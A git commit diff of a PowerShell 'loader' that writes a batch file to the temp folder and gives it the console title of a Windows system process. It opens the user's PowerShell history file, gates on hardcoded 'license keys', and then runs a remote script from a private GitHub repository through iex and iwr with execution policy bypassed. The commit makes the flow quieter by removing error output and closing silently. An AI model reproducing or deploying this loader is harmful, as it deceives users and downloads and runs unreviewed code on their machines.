ae8ce25a0ecf9d820218a71bc08e7f93ec3f3f58
lnwmon2-crypto <lnwmon2@gmail.com>
2026-03-28 17:58:20 +0700

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -4,15 +4,14 @@ $path = "$env:TEMP\run.bat"
 @echo off
 mode con: cols=50 lines=15
 title C:\Windows\System32\conhost.exe
-color 07
+color 70
 cls
 
 set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 if not exist "%hist%" type nul > "%hist%"
-start notepad "%hist%"
+start "" notepad "%hist%"
 
 :input
-echo.
 set /p key=Enter license key: 
 set key=%key: =%
 
@@ -29,17 +28,17 @@ if "%key%"=="finalpremium-ZX90N" goto ok
 if "%key%"=="finalpremium-MN45R" goto ok
 if "%key%"=="finalpremium-LL22X" goto ok
 
-echo Invalid key
 goto input
 
 :ok
 powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
-cls
-echo Successfully
 
-:: ล็อคไม่ให้พิมพ์ต่อ
-pause >nul
+cls
+color 07
+echo Successfully
+timeout /t 2 >nul
+exit
 "@ | Out-File -Encoding ASCII $path
 
-cmd.exe /c start "" cmd /k "$path"
+cmd.exe /c start "" cmd /c "$path"
 exit
